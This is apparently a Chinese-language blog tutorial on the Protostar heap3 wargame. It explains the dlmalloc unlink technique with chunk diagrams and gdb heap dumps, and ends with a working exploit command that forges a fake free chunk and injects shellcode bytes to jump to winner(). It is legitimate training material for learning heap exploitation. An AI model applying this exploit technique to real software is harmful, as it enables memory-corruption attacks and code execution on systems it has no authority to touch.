---
layout: post
title: Protostar教程之unlink
excerpt: "heap漏洞之unlink"
categories: [Protostar系列教程]
comments: true
---

参考地址:https://secinject.wordpress.com/2018/01/18/protostar-heap3/

漏洞代码如下
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
 
void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}
 
int main(int argc, char **argv)
{
  char *a, *b, *c;
 
  a = malloc(32);
  b = malloc(32);
  c = malloc(32);
 
  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);
 
  free(c);
  free(b);
  free(a);
 
  printf("dynamite failed?\n");
}
```
我们的目标是运行winner function

首先我们看一下分配的堆块与空闲的堆块

![Image text](https://raw.githubusercontent.com/snappyJack/snappyjack.github.io/master/img/Protostar教程之unlink_1.png)

 As a short reminder: dlmalloc keeps free chunks (chunks available for allocation) in a doubly linked list of chunks (right side of Image 1). Each free chunk has fields representing:
简短的提醒:dlmalloc将free chunks(右边的图)使用双向链表串起来,chunk中每个区域都有它的意义:

- Prev_size: 如果前一个chunk的状态是allocated, 那么这个字段代表它(前一个chunk)的大小.
- Size: free chunk的大小
- FD pointer: 存放doubly linked list的指针指向下一个free chunk
- BK pointer: 存放doubly linked list的指针指向上一个free chunk
- Unused space: 如果该chunk被分配,那么这块区域存放数据
- Size: chunk的大小, this field is used for easier merging of chunks.

同样,allocated chunk各个字段的意义:

- Previous size: 如果前一个chunk是allocated,那么这个字段的值为前一个chunk的大小的最后4个字节.如果前一个chunk是free,那么这个字段代表了前一个chunk的大小
- Size: chunk的大小. 最后一个字节表示前一个chunk是否再被使用
- User data: 存放数据
 
如果我们将allocated chunk变为free chunk,User data前8个字节将变为 free chunk的 FD和BK指针,我们之后将利用这一点进行漏洞利用

```
内存中数据的样子          | 
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"a" allocated space [32B] |
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"b" allocated space [32B] |
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"c" allocated space [32B] |
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
TOP CHUNK                 |
--------------------------|
...                       |
--------------------------|
STACK                     |
--------------------------|
c                         |
--------------------------|
b                         |
--------------------------|
a                         |
--------------------------|
```
### 重点：
当我们调用free(c)时候: The program will see that the “c” chunk’s size field is set to 0xfffffffc which represents -4 and because it is an even value, it will think the previous chunk is free. Then, by Image 5, line 4, it will navigate to the previous free chunk by subtracting its prev_size field (0xfffffff8 = -8) from the start of “c” chunk pointer and thus actually adding +8 and moving into the “c” chunk by 8 bytes, arriving at the beginning of the memory allocated by malloc(c). We can then forge an “virtual” chunk inside the chunk “c”‘s “User data” field which will be interpreted as a free chunk and unlinked. This looks like this:
```
内存中数据的样子          | 
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"a" allocated space [32B] |
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"b" allocated space [32B] |
--------------------------|
0xfffffff8                |
--------------------------|
0xfffffffc                | 
--------------------------|
cccc                      |
--------------------------|
cccc                      | 
--------------------------|
redir_addr -12            | 
--------------------------|
winner_addr               |
--------------------------|
```
The “CCCCCCCC” bytes represent fake prev_size and size bytes in the fake chunk made inside the “c” chunk “User data” space after which (redir_addr – 12) and winner_addr are located, which represend FD and BK because the fake chunk is considered free.

free前堆中的情况：
```bash
0x804b000:	0x00000000	0x00000029	0x61616161	0x61616161
0x804b010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x62626262	0x62626262	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00000029	0x63636363	0x63636363
0x804b060:	0x63636363	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00020f89
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
```
free(c)
```bash
0x804b000:	0x00000000	0x00000029	0x61616161	0x61616161
0x804b010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x62626262	0x62626262	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00000029	0x00000000	0x63636363
0x804b060:	0x63636363	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00020f89
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
```
free(b)
```bash
0x804b000:	0x00000000	0x00000029	0x61616161	0x61616161
0x804b010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x0804b050	0x62626262	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00000029	0x00000000	0x63636363
0x804b060:	0x63636363	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00020f89
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
```
free(a)
```bash
0x804b000:	0x00000000	0x00000029	0x0804b028	0x61616161
0x804b010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x0804b050	0x62626262	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00000029	0x00000000	0x63636363
0x804b060:	0x63636363	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00020f89
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
```

最终pwn代码：
```
./heap3 `python -c 'print "A"*16 + "\xb8\x64\x88\x04\x08\xff\xe0"'` `python -c 'print "A"*32 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "B"*8 + "\x1c\xb1\x04\x08" + "\x18\xc0\x04\x08"'`
```